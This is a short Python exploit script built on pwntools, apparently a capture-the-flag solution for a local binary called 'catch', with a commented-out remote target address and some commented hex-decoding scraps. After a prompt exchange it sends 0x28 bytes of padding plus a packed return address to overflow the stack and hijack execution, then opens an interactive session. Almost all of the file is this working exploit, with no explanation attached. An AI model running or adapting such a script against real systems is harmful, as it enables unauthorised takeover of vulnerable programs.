from pwn import *

# s = "99b1ff8f11781541f7f89f9bd41c4a17"

# ss = []

# ret = ""

# for i in range(0, 16):
#     ret += chr(int(s[i*2: i*2+2], 16))

# # print(ss)
# print(ret)

io = process("./catch")

#io = process("./test_bins/printf")
# io = remote("192.168.1.180", 9981)


io.recvuntil("plz")
io.sendline("aaa")
io.recvuntil("plz")

# io.sendline("a"*0x28 + p64(0x400d98))
io.sendline("a"*0x28 + p64(0x400e00))

io.interactive()
